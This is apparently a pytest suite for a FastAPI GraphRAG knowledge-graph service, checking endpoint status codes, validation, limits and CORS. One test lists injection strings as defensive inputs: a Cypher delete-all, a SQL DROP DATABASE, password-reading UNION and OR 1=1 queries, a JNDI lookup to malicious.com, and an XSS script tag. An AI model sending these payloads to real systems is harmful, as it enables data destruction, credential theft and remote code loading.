import os
import sys
import tempfile
import pytest
from unittest.mock import patch
from fastapi.testclient import TestClient

# Ensure backend is on sys.path
sys.path.insert(0, os.path.abspath("backend"))
from main import app

client = TestClient(app)


# ==============================================================================
# 1. Health Endpoint Tests & Method Boundaries
# ==============================================================================

def test_health_endpoint_success():
    """Verify GET /health returns 200 and {'status': 'ok'}."""
    response = client.get("/health")
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("application/json")
    assert response.json() == {"status": "ok"}


@pytest.mark.parametrize("method", ["post", "put", "delete", "patch"])
def test_health_endpoint_invalid_methods(method):
    """Verify HTTP methods other than GET return 405 Method Not Allowed."""
    req_func = getattr(client, method)
    response = req_func("/health")
    assert response.status_code == 405


# ==============================================================================
# 2. Root Endpoint Tests & Method Boundaries
# ==============================================================================

def test_root_endpoint_metadata():
    """Verify GET / returns 200 and all documented endpoints."""
    response = client.get("/")
    assert response.status_code == 200
    data = response.json()
    assert data["service"] == "GraphRAG Knowledge Graph API"
    assert "endpoints" in data
    assert "POST /ingest" in data["endpoints"]
    assert "GET /graph" in data["endpoints"]
    assert "POST /graphrag" in data["endpoints"]


@pytest.mark.parametrize("method", ["post", "put", "delete", "patch"])
def test_root_endpoint_invalid_methods(method):
    """Verify non-GET requests to root return 405."""
    req_func = getattr(client, method)
    response = req_func("/")
    assert response.status_code == 405


# ==============================================================================
# 3. Ingest Endpoint Tests & Boundary Cases
# ==============================================================================

@patch("main.ingest_pipeline")
def test_ingest_endpoint_valid_payload(mock_pipeline):
    """Verify POST /ingest handles valid directory payload."""
    mock_pipeline.return_value = {
        "status": "success",
        "nodes_created": 25,
        "edges_created": 30,
        "files_processed": 3
    }
    response = client.post("/ingest", json={"pdf_dir": "/data/pdfs/"})
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "success"
    assert data["nodes_created"] == 25
    assert data["edges_created"] == 30
    assert data["files_processed"] == 3


def test_ingest_endpoint_empty_directory():
    """Verify POST /ingest on an empty directory returns 0 processed files without errors."""
    with tempfile.TemporaryDirectory() as empty_dir:
        response = client.post("/ingest", json={"pdf_dir": empty_dir})
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert data["files_processed"] == 0
        assert data["nodes_created"] == 0
        assert data["edges_created"] == 0


def test_ingest_endpoint_nonexistent_directory():
    """Verify POST /ingest returns 404 when the target directory does not exist."""
    non_existent = os.path.join(tempfile.gettempdir(), "non_existent_graphrag_dir_12345")
    response = client.post("/ingest", json={"pdf_dir": non_existent})
    assert response.status_code == 404
    assert "not found" in response.json()["detail"].lower()


@pytest.mark.parametrize("invalid_payload", [
    {},                                 # missing pdf_dir
    {"pdf_dir": None},                  # null value
    {"pdf_dir": 12345},                 # integer instead of string
    {"pdf_dir": ["/data/pdfs/"]},       # list instead of string
    {"wrong_key": "/data/pdfs/"},       # wrong field name
])
def test_ingest_endpoint_payload_validation_failures(invalid_payload):
    """Verify POST /ingest rejects malformed payloads with 422 Unprocessable Entity."""
    response = client.post("/ingest", json=invalid_payload)
    assert response.status_code == 422


@patch("main.ingest_pipeline")
def test_ingest_endpoint_internal_error_handling(mock_pipeline):
    """Verify POST /ingest returns 500 when pipeline raises an unexpected exception."""
    mock_pipeline.side_effect = RuntimeError("Database driver failed to write nodes")
    response = client.post("/ingest", json={"pdf_dir": "/data/pdfs/"})
    assert response.status_code == 500
    assert "Ingestion failed: Database driver failed to write nodes" in response.json()["detail"]


@pytest.mark.parametrize("method", ["get", "put", "delete", "patch"])
def test_ingest_endpoint_invalid_methods(method):
    """Verify non-POST requests to /ingest return 405."""
    req_func = getattr(client, method)
    response = req_func("/ingest")
    assert response.status_code == 405


# ==============================================================================
# 4. Graph Endpoint Boundary & Schema Tests
# ==============================================================================

@patch("main.get_subgraph_data")
def test_graph_endpoint_default_limit(mock_get_subgraph):
    """Verify GET /graph uses default limit=50."""
    mock_get_subgraph.return_value = {"nodes": [], "edges": []}
    response = client.get("/graph")
    assert response.status_code == 200
    mock_get_subgraph.assert_called_once_with(limit=50)


@patch("main.get_subgraph_data")
def test_graph_endpoint_lower_boundary_limit_one(mock_get_subgraph):
    """Verify GET /graph accepts minimum valid boundary limit=1."""
    mock_get_subgraph.return_value = {
        "nodes": [{"id": "1", "name": "A", "type": "Concept", "description": "Desc"}],
        "edges": []
    }
    response = client.get("/graph?limit=1")
    assert response.status_code == 200
    mock_get_subgraph.assert_called_once_with(limit=1)
    data = response.json()
    assert len(data["nodes"]) == 1


@patch("main.get_subgraph_data")
def test_graph_endpoint_upper_boundary_limit_500(mock_get_subgraph):
    """Verify GET /graph accepts maximum valid boundary limit=500."""
    mock_get_subgraph.return_value = {"nodes": [], "edges": []}
    response = client.get("/graph?limit=500")
    assert response.status_code == 200
    mock_get_subgraph.assert_called_once_with(limit=500)


@pytest.mark.parametrize("invalid_limit", [
    0,      # below minimum (ge=1)
    -1,     # negative
    -50,    # large negative
    501,    # above maximum (le=500)
    1000,   # large positive over maximum
    "abc",  # non-numeric string
    "1.5",  # float string
])
def test_graph_endpoint_boundary_violations(invalid_limit):
    """Verify GET /graph rejects limits violating boundary constraints with 422."""
    response = client.get(f"/graph?limit={invalid_limit}")
    assert response.status_code == 422


@patch("main.get_subgraph_data")
def test_graph_endpoint_error_handling(mock_get_subgraph):
    """Verify GET /graph returns 500 when backend query fails."""
    mock_get_subgraph.side_effect = TimeoutError("Neo4j socket timeout")
    response = client.get("/graph")
    assert response.status_code == 500
    assert "Graph retrieval failed: Neo4j socket timeout" in response.json()["detail"]


@pytest.mark.parametrize("method", ["post", "put", "delete", "patch"])
def test_graph_endpoint_invalid_methods(method):
    """Verify non-GET requests to /graph return 405."""
    req_func = getattr(client, method)
    response = req_func("/graph")
    assert response.status_code == 405


# ==============================================================================
# 5. GraphRAG Endpoint Tests & Edge Cases
# ==============================================================================

@patch("main.run_graphrag")
def test_graphrag_endpoint_success(mock_run_graphrag):
    """Verify POST /graphrag returns correctly typed GraphRAGResponse schema."""
    mock_run_graphrag.return_value = {
        "question": "What is Neo4j?",
        "anchor_nodes": [
            {"name": "Neo4j", "type": "Technology", "score": 0.98}
        ],
        "subgraph_context": "=== Anchor Nodes ===\n- Neo4j [Technology]: Graph database",
        "answer": "Neo4j is an ACID-compliant graph database management system."
    }
    response = client.post("/graphrag", json={"question": "What is Neo4j?"})
    assert response.status_code == 200
    data = response.json()
    assert data["question"] == "What is Neo4j?"
    assert len(data["anchor_nodes"]) == 1
    assert data["anchor_nodes"][0]["name"] == "Neo4j"
    assert data["anchor_nodes"][0]["type"] == "Technology"
    assert data["anchor_nodes"][0]["score"] == 0.98
    assert "Neo4j is an ACID-compliant" in data["answer"]


@pytest.mark.parametrize("empty_q", [
    "",
    "   ",
    "\t\t",
    "\n\n\r\n",
    "      \n   "
])
def test_graphrag_endpoint_empty_or_whitespace_question(empty_q):
    """Verify POST /graphrag returns 400 when question is empty or pure whitespace."""
    response = client.post("/graphrag", json={"question": empty_q})
    assert response.status_code == 400
    assert response.json()["detail"] == "Question cannot be empty."


@pytest.mark.parametrize("invalid_payload", [
    {},                                 # missing question
    {"question": None},                 # null
    {"question": 9999},                 # integer
    {"question": ["What is AI?"]},      # array
    {"prompt": "What is AI?"},          # wrong field name
])
def test_graphrag_endpoint_payload_validation_failures(invalid_payload):
    """Verify POST /graphrag rejects malformed payloads with 422."""
    response = client.post("/graphrag", json=invalid_payload)
    assert response.status_code == 422


@patch("main.run_graphrag")
def test_graphrag_endpoint_huge_question_boundary(mock_run_graphrag):
    """Verify POST /graphrag gracefully handles massive text input boundary (10,000 characters)."""
    mock_run_graphrag.return_value = {
        "question": "X" * 10000,
        "anchor_nodes": [],
        "subgraph_context": "=== Anchor Nodes ===\n- None identified.",
        "answer": "Processed long input successfully."
    }
    long_question = "Explain " + ("knowledge graph " * 800)
    response = client.post("/graphrag", json={"question": long_question})
    assert response.status_code == 200
    assert response.json()["answer"] == "Processed long input successfully."


@patch("main.run_graphrag")
@pytest.mark.parametrize("injection_string", [
    "MATCH (n) DETACH DELETE n RETURN n",
    "'; DROP DATABASE neo4j; --",
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "UNION ALL MATCH (u:User) RETURN u.password",
    "${jndi:ldap://malicious.com/a}",
    "<script>alert('xss')</script>",
])
def test_graphrag_endpoint_injection_resilience(mock_run_graphrag, injection_string):
    """Verify POST /graphrag is resilient against Cypher, SQL, and script injection strings."""
    mock_run_graphrag.return_value = {
        "question": injection_string,
        "anchor_nodes": [],
        "subgraph_context": "=== Anchor Nodes ===\n- None identified.",
        "answer": f"Processed safe query for: {injection_string}"
    }
    response = client.post("/graphrag", json={"question": injection_string})
    assert response.status_code == 200
    mock_run_graphrag.assert_called_with(injection_string)


@patch("main.run_graphrag")
def test_graphrag_endpoint_unicode_and_emojis(mock_run_graphrag):
    """Verify POST /graphrag handles international languages and Unicode emoji characters."""
    unicode_query = "What is GraphRAG? 🧠 🕸️ 机器学习 and 反向传播."
    mock_run_graphrag.return_value = {
        "question": unicode_query,
        "anchor_nodes": [{"name": "GraphRAG", "type": "Technology", "score": 0.99}],
        "subgraph_context": "=== Anchor Nodes ===",
        "answer": "Answer containing Unicode: 🚀"
    }
    response = client.post("/graphrag", json={"question": unicode_query})
    assert response.status_code == 200
    data = response.json()
    assert data["question"] == unicode_query
    assert data["answer"] == "Answer containing Unicode: 🚀"


@patch("main.run_graphrag")
def test_graphrag_endpoint_pipeline_error(mock_run_graphrag):
    """Verify POST /graphrag returns 500 when run_graphrag fails."""
    mock_run_graphrag.side_effect = RuntimeError("OpenAI rate limit exceeded")
    response = client.post("/graphrag", json={"question": "What is AI?"})
    assert response.status_code == 500
    assert "GraphRAG execution failed: OpenAI rate limit exceeded" in response.json()["detail"]


@pytest.mark.parametrize("method", ["get", "put", "delete", "patch"])
def test_graphrag_endpoint_invalid_methods(method):
    """Verify non-POST requests to /graphrag return 405."""
    req_func = getattr(client, method)
    response = req_func("/graphrag")
    assert response.status_code == 405


# ==============================================================================
# 6. CORS and Security Headers
# ==============================================================================

def test_cors_headers_present():
    """Verify CORS headers are set properly for frontend cross-origin requests."""
    response = client.options(
        "/graph",
        headers={
            "Origin": "http://localhost:8501",
            "Access-Control-Request-Method": "GET"
        }
    )
    assert response.status_code == 200
    assert response.headers.get("access-control-allow-origin") in ("*", "http://localhost:8501")
    assert "GET" in response.headers.get("access-control-allow-methods", "")
